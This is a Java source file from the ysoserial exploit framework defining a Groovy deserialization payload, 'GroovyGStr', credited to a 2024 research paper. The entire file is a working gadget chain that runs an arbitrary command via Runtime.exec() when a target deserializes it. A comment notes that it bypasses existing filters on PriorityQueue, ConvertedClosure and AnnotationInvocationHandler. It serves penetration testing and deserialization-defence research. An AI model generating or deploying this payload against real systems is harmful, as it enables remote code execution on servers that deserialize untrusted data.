package ysoserial.payloads;

import java.util.concurrent.ConcurrentHashMap;

import org.codehaus.groovy.runtime.GStringImpl;
import org.codehaus.groovy.runtime.MethodClosure;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Gadget chain (JDD, IEEE S&P 2024 — BofeiC/JDD-PocLearning):
		ObjectInputStream.readObject()
			ConcurrentHashMap.readObject()
				GStringImpl.hashCode()
					GString.toString()
						GString.writeTo()
							InvokerHelper.write()
								Closure.writeTo()
									MethodClosure.call()
										"command".execute()
											Runtime.exec()

	Differs from Groovy1:
		- Entry: ConcurrentHashMap (not PriorityQueue)
		- Trigger: hashCode→toString→writeTo (not Proxy→ConvertedClosure)
		- Bypasses filters on PriorityQueue, ConvertedClosure, AnnotationInvocationHandler

	Requires:
		groovy
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"org.codehaus.groovy:groovy:2.4.3"})
@Authors({ Authors.BOFEI_CHEN })
public class GroovyGStr extends PayloadRunner implements ObjectPayload<ConcurrentHashMap> {

	public ConcurrentHashMap getObject(final String command) throws Exception {
		// Create MethodClosure without constructor (Groovy 2.3.9 <clinit> fails on JDK17)
		final MethodClosure methodClosure = Reflections.createWithoutConstructor(MethodClosure.class);
		// Set Closure fields needed for serialization
		Reflections.setFieldValue(methodClosure, "owner", command);
		Reflections.setFieldValue(methodClosure, "delegate", command);
		Reflections.setFieldValue(methodClosure, "method", "execute");
		Reflections.setFieldValue(methodClosure, "maximumNumberOfParameters", 0);
		Reflections.setFieldValue(methodClosure, "parameterTypes", new Class[0]);

		// Create GStringImpl without constructor
		final GStringImpl gStr = Reflections.createWithoutConstructor(GStringImpl.class);
		// Set values to safe dummy first
		Reflections.setFieldValue(gStr, "values", new Object[]{ "safe" });
		Reflections.setFieldValue(gStr, "strings", new String[]{ "", "" });

		// Insert into ConcurrentHashMap — hashCode computed with safe value
		final ConcurrentHashMap map = new ConcurrentHashMap();
		map.put(gStr, "anything");

		// Swap in the malicious MethodClosure via reflection
		Reflections.setFieldValue(gStr, "values", new Object[]{ methodClosure });

		return map;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(GroovyGStr.class, args);
	}
}
